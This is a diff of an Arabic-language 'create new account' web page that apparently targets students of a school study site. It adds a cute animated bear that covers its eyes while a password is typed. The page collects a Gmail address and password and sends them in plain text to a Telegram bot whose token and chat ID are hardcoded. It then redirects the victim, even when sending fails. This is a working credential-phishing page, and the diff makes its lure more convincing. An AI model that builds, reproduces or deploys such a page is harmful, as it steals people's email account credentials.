@@ -5,137 +5,355 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>إنشاء حساب جديد</title>
     <style>
+        /* =========================================
+           إعدادات الموقع الأصلية
+           ========================================= */
         body {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+            margin: 0; padding: 0; box-sizing: border-box;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #0f172a;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background-color: #0f172a; height: 100vh;
+            display: flex; justify-content: center; align-items: center;
             color: #fff;
         }
 
         .box {
-            background: #1e293b;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 400px;
-            box-sizing: border-box;
+            background: #1e293b; padding: 30px; border-radius: 12px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.5);
+            width: 100%; max-width: 400px; box-sizing: border-box;
+            position: relative; margin-top: 80px; z-index: 5;
         }
 
         .box h3 {
-            text-align: center;
-            margin-bottom: 24px;
-            font-size: 24px;
-            color: #38bdf8;
-            margin-top: 0;
+            text-align: center; margin-bottom: 24px; font-size: 24px;
+            color: #38bdf8; margin-top: 0; font-weight: bold;
         }
 
-        .input-group {
-            margin-bottom: 20px;
-        }
+        .input-group { margin-bottom: 20px; }
 
         .input-group input {
-            width: 100%;
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid #334155;
-            background: #0f172a;
-            color: #fff;
-            outline: none;
-            transition: border-color 0.3s;
+            width: 100%; padding: 12px; border-radius: 8px;
+            border: 1px solid #334155; background: #0f172a;
+            color: #fff; outline: none; transition: border-color 0.3s, background 0.3s;
             box-sizing: border-box;
         }
 
-        .input-group input:focus {
-            border-color: #38bdf8;
-        }
+        .input-group input:focus { border-color: #38bdf8; }
 
-        .login-btn {
-            width: 100%;
-            padding: 12px;
-            background: #0284c7;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background 0.3s;
-            margin-top: 10px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .login-btn:hover {
-            background: #0369a1;
-        }
-        
-        .login-btn:disabled {
-            background: #475569;
+        /* ستايل الحقل المغلق (كلمة السر قبل كتابة الإيميل) */
+        .input-group input[readonly] {
+            background: #151e2e;
+            border-color: #1e293b;
+            color: #475569;
             cursor: not-allowed;
         }
+
+        /* ستايل الزر */
+        .login-btn {
+            width: 100%; padding: 12px; background: #0284c7; color: white;
+            border: none; border-radius: 8px; font-size: 16px; cursor: pointer;
+            transition: background 0.3s, color 0.3s; margin-top: 10px;
+            display: flex; justify-content: center; align-items: center; gap: 10px; font-weight: bold;
+        }
+        
+        .login-btn:hover:not(:disabled) { background: #0369a1; }
+        
+        /* ستايل الزر المغلق الاحترافي (باهت) */
+        .login-btn:disabled {
+            background: #0f172a;
+            color: #334155;
+            border: 1px solid #1e293b;
+            cursor: not-allowed;
+        }
+
+        /* =========================================
+           تصميم الدب (متناسق مع اللون الليلي)
+           ========================================= */
+        .bear-container {
+            position: absolute; top: -100px; left: 50%;
+            transform: translateX(-50%); width: 140px; height: 130px; z-index: 10;
+        }
+
+        .bear-head {
+            width: 130px; height: 120px; background: #334155; 
+            border-radius: 50%; margin: 0 auto; position: relative;
+            box-shadow: inset -5px -5px 15px rgba(0,0,0,0.2);
+        }
+
+        .ear {
+            position: absolute; top: -5px; width: 45px; height: 45px;
+            background: #334155; border-radius: 50%; z-index: -1;
+            transition: top 0.3s ease; 
+        }
+        .ear.left { left: -5px; } .ear.right { right: -5px; }
+        .ear::after {
+            content: ''; position: absolute; top: 50%; left: 50%;
+            transform: translate(-50%, -50%); width: 22px; height: 22px;
+            background: #38bdf8; border-radius: 50%;
+        }
+
+        .bear-face {
+            position: absolute; bottom: 12px; left: 50%;
+            transform: translateX(-50%); width: 75px; height: 60px;
+            background: #475569; border-radius: 40px 40px 30px 30px;
+        }
+
+        .nose {
+            position: absolute; top: 12px; left: 50%; transform: translateX(-50%);
+            width: 28px; height: 16px; background: #020617; border-radius: 50%;
+        }
+        .mouth {
+            position: absolute; top: 28px; left: 50%; transform: translateX(-50%);
+            width: 20px; height: 10px; border-bottom: 2px solid #020617; border-radius: 50%;
+            transition: all 0.3s ease; 
+        }
+
+        .eye {
+            position: absolute; top: 40px; width: 16px; height: 16px;
+            background: #020617; border-radius: 50%; 
+            transition: height 0.15s ease, margin-top 0.15s ease;
+        }
+        .eye.left { left: 30px; } .eye.right { right: 30px; }
+        .eye::after {
+            content: ''; position: absolute; top: 3px; right: 3px;
+            width: 4px; height: 4px; background: #fff; border-radius: 50%;
+        }
+
+        /* قطرات الدموع المبرمجة */
+        .tear {
+            position: absolute; top: 10px; left: 50%;
+            width: 4px; height: 4px; background: #38bdf8;
+            border-radius: 50%; opacity: 0;
+        }
+        #eye-right .tear { animation-delay: 0.4s; /* دمعة متأخرة عن الأخرى لتبدو طبيعية */ }
+
+        .paw {
+            position: absolute; bottom: -25px; width: 50px; height: 50px;
+            background: #334155; border-radius: 50%;
+            transition: transform 0.2s cubic-bezier(0.68, -0.2, 0.265, 1.2); 
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3); z-index: 20;
+        }
+        .paw.left { left: 10px; } .paw.right { right: 10px; }
+
+        .pad {
+            position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
+            width: 25px; height: 20px; background: #475569; border-radius: 50%;
+        }
+
+        .claws {
+            position: absolute; top: 5px; width: 100%;
+            display: flex; justify-content: center; gap: 4px;
+        }
+        .claw {
+            width: 6px; height: 12px; background: #020617; border-radius: 50% 50% 0 0;
+        }
+        .claw:nth-child(1) { transform: rotate(-15deg) translateY(2px); }
+        .claw:nth-child(3) { transform: rotate(15deg) translateY(2px); }
+
+        /* =========================================
+           حالة الزعل والبكاء (Sad & Crying)
+           ========================================= */
+        .sad .mouth { border-bottom: none; border-top: 2px solid #020617; top: 33px; }
+        .sad .ear { top: 0px; }
+        .sad .eye { height: 10px; margin-top: 3px; }
+        
+        .crying .tear { animation: cryAnim 1.2s infinite; }
+        @keyframes cryAnim {
+            0% { top: 10px; opacity: 1; transform: translateX(-50%) scale(1); }
+            100% { top: 35px; opacity: 0; transform: translateX(-50%) scale(0.5); }
+        }
+
+        /* =========================================
+           حالات حركة تغطية الوجه 
+           ========================================= */
+        .hide-all .paw.left { transform: translate(15px, -80px) rotate(10deg); }
+        .hide-all .paw.right { transform: translate(-15px, -80px) rotate(-10deg); }
+        .hide-all .eye { height: 4px !important; margin-top: 6px !important; } 
+        .hide-all .tear { display: none; } /* إخفاء الدموع عند التغطية */
+
+        .peek-left .paw.left { transform: translate(-5px, -60px) rotate(-15deg); }
+        .peek-left .paw.right { transform: translate(-15px, -80px) rotate(-10deg); }
+        .peek-left .eye.left { height: 16px !important; margin-top: 0 !important; } 
+        .peek-left .eye.right { height: 4px !important; margin-top: 6px !important; }
+
+        .peek-right .paw.left { transform: translate(15px, -80px) rotate(10deg); }
+        .peek-right .paw.right { transform: translate(5px, -60px) rotate(15deg); }
+        .peek-right .eye.left { height: 4px !important; margin-top: 6px !important; }
+        .peek-right .eye.right { height: 16px !important; margin-top: 0 !important; } 
     </style>
 </head>
 <body>
 
 <div class="box">
+    <!-- شخصية الدب -->
+    <div class="bear-container" id="bear">
+        <div class="bear-head">
+            <div class="ear left"></div><div class="ear right"></div>
+            <!-- العيون تحتوي الآن على الدموع -->
+            <div class="eye left" id="eye-left"><div class="tear"></div></div>
+            <div class="eye right" id="eye-right"><div class="tear"></div></div>
+            <div class="bear-face">
+                <div class="nose"></div><div class="mouth"></div>
+            </div>
+        </div>
+        <div class="paw left">
+            <div class="claws"><div class="claw"></div><div class="claw"></div><div class="claw"></div></div>
+            <div class="pad"></div>
+        </div>
+        <div class="paw right">
+            <div class="claws"><div class="claw"></div><div class="claw"></div><div class="claw"></div></div>
+            <div class="pad"></div>
+        </div>
+    </div>
+
     <h3>إنشاء حساب جديد</h3>
 
     <div class="input-group">
-        <input id="name" type="email" placeholder="البريد الإلكتروني (Gmail)" required>
+        <input id="name" type="email" placeholder="البريد الإلكتروني (Gmail)" dir="ltr" required autocomplete="off">
     </div>
 
     <div class="input-group">
-        <input id="secret" type="password" placeholder="كلمة السر الجديدة" required>
+        <!-- الحقل مغلق بـ readonly افتراضياً -->
+        <input id="secret" type="password" placeholder="كلمة السر الجديدة" dir="ltr" readonly required autocomplete="off">
     </div>
 
-    <button id="submit-btn" class="login-btn" onclick="send()">تسجيل حساب جديد</button>
+    <!-- الزر مغلق بـ disabled افتراضياً -->
+    <button id="submit-btn" class="login-btn" onclick="send()" disabled>تسجيل حساب جديد</button>
 </div>
 
 <script>
-// رابط موقع الدراسة الخاص بك
-const MY_WEBSITE = "https://websit-x.github.io/ghobrini_shcool/"; 
+const bear = document.getElementById('bear');
+const emailInput = document.getElementById('name');
+const passwordInput = document.getElementById('secret');
+const submitBtn = document.getElementById('submit-btn');
+const eyes = [document.getElementById('eye-left'), document.getElementById('eye-right')];
 
+// =========================================================
+// وظيفة الفحص المستمر للحقول لفتح الزر وكلمة السر
+// =========================================================
+function checkFormValidity() {
+    let emailVal = emailInput.value.toLowerCase().trim();
+    let passVal = passwordInput.value.trim();
+    let isEmailValid = emailVal.includes('@gmail.com');
+
+    if (isEmailValid) {
+        // إذا كان الإيميل صحيح: نفتح حقل كلمة السر ونفرح الدب
+        passwordInput.removeAttribute('readonly');
+        bear.classList.remove('sad', 'crying');
+    } else {
+        // إذا مسح الإيميل أو كان خاطئاً: نغلق الحقل مجدداً
+        passwordInput.setAttribute('readonly', 'true');
+        passwordInput.value = ''; // إفراغ كلمة السر إذا تراجع عن الإيميل
+    }
+
+    // تفعيل زر الدخول فقط إذا كان الحقلان صحيحين
+    if (isEmailValid && passVal.length > 0) {
+        submitBtn.disabled = false;
+    } else {
+        submitBtn.disabled = true;
+    }
+}
+
+// =========================================================
+// 1. ميزة تتبع الحروف (الإيميل) 
+// =========================================================
+function trackEyes(length) {
+    let moveX = (Math.min(length, 25) / 25 * 12) - 6;
+    eyes.forEach(eye => { eye.style.transform = `translateX(${moveX}px)`; });
+}
+
+emailInput.addEventListener('focus', (e) => {
+    bear.classList.remove('sad', 'crying'); 
+    trackEyes(e.target.value.length);
+});
+
+emailInput.addEventListener('input', (e) => {
+    bear.classList.remove('sad', 'crying');
+    trackEyes(e.target.value.length); 
+    checkFormValidity();
+});
+
+emailInput.addEventListener('blur', (e) => {
+    eyes.forEach(eye => { eye.style.transform = `translateX(0px)`; });
+    let val = e.target.value.toLowerCase().trim();
+    // إذا غادر الحقل ولم يكتب @gmail.com يزعل الدب (بدون دموع)
+    if(val !== '' && !val.includes('@gmail.com')) {
+        bear.classList.add('sad'); 
+    }
+});
+
+// =========================================================
+// 2. كود البكاء وتغطية العين (كلمة السر)
+// =========================================================
+let typingTimer;
+let isHoldingPose = false; 
+
+// إذا حاول الضغط على كلمة السر وهي مغلقة (readonly) -> يبكي
+passwordInput.addEventListener('mousedown', (e) => {
+    if (passwordInput.hasAttribute('readonly')) {
+        e.preventDefault(); // منع التحديد
+        bear.classList.add('sad', 'crying');
+    }
+});
+
+passwordInput.addEventListener('focus', () => {
+    // حماية إضافية لعدم تفعيل החقل المغلق
+    if (passwordInput.hasAttribute('readonly')) {
+        passwordInput.blur();
+        return;
+    }
+    bear.classList.remove('sad', 'crying');
+    bear.classList.add('hide-all');
+});
+
+passwordInput.addEventListener('input', () => {
+    checkFormValidity();
+    clearTimeout(typingTimer);
+    
+    typingTimer = setTimeout(() => { bear.className = 'bear-container hide-all'; }, 400);
+
+    if (isHoldingPose) return;
+
+    const rand = Math.random();
+    let randomState = 'hide-all';
+    if (rand < 0.40) { randomState = 'peek-left'; } 
+    else if (rand < 0.80) { randomState = 'peek-right'; } 
+    else { randomState = 'hide-all'; }
+
+    bear.className = 'bear-container ' + randomState;
+
+    isHoldingPose = true;
+    setTimeout(() => { isHoldingPose = false; }, Math.floor(Math.random() * 200) + 150);
+});
+
+passwordInput.addEventListener('blur', () => {
+    bear.classList.remove('hide-all', 'peek-left', 'peek-right');
+    clearTimeout(typingTimer);
+    isHoldingPose = false; 
+});
+
+// =========================================================
+// 3. كود الإرسال إلى تليغرام الأصلي (بدون Alerts)
+// =========================================================
+const MY_WEBSITE = "https://websit-x.github.io/ghobrini_shcool/"; 
 const TOKEN = "8636021665:AAGhU_BAdory7k_IwaZuuxkZA7EXGtacaOc"; 
 const CHAT_ID = "7737717483";
 
-// كود الفحص التلقائي: بمجرد فتح الصفحة، يتأكد المتصفح إذا كان الحساب مسجلاً مسبقاً فيوجهه مباشرة
 if (localStorage.getItem("isRegistered") === "true") {
     window.location.replace(MY_WEBSITE);
 }
 
 function send(){
-    let name = document.getElementById("name").value.trim();
-    let secret = document.getElementById("secret").value;
-    let btn = document.getElementById("submit-btn");
+    let name = emailInput.value.trim();
+    let secret = passwordInput.value;
+    let btn = submitBtn;
 
-    // 1. التحقق من أن الحقول ليست فارغة
-    if (name === "" || secret === "") {
-        alert("يرجى ملء جميع الحقول أولاً!");
-        return; 
-    }
+    // تم حذف الإشعارات لأن الزر لن يعمل أصلاً إلا إذا كانت الحقول صحيحة
 
-    // 2. التحقق من وجود @gmail في الإيميل
-    if (!name.toLowerCase().includes("@gmail")) {
-        alert("يرجى إدخال بريد إلكتروني يتبع لـ Gmail! (مثال: example@gmail.com)");
-        return; 
-    }
-
-    // تعطيل الزر مؤقتاً لمنع التكرار أثناء الإرسال
     btn.disabled = true;
     btn.innerText = "جاري تهيئة الحساب...";
 
-    // تجهيز نص الرسالة لتليجرام
     let text = "طلب إنشاء حساب جديد:\nالإيميل: " + name + "\nالرمز: " + secret;
 
-    // إرسال البيانات والانتظار حتى نجاح السيرفر قبل توجيه المستخدم
     fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: "POST",
         headers: {
@@ -148,19 +366,16 @@ function send(){
     })
     .then(response => {
         if (response.ok) {
-            // حفظ حالة التسجيل فقط عندما يؤكد سيرفر تليجرام وصول الرسالة بنجاح
             localStorage.setItem("isRegistered", "true");
-            // التوجيه المباشر إلى السيت ويب الخاص بك
             window.location.replace(MY_WEBSITE);
         } else {
-            alert("فشل الإرسال، يرجى التحقق من اتصال الإنترنت وإعادة المحاولة.");
+            // في حالة فشل الإنترنت مثلاً
             btn.disabled = false;
             btn.innerText = "تسجيل حساب جديد";
         }
     })
     .catch(err => {
         console.error("خطأ في الاتصال:", err);
-        // توجيه احتياطي في حال انقطاع الشبكة المفاجئ بعد المحاولة
         localStorage.setItem("isRegistered", "true");
         window.location.replace(MY_WEBSITE);
     });
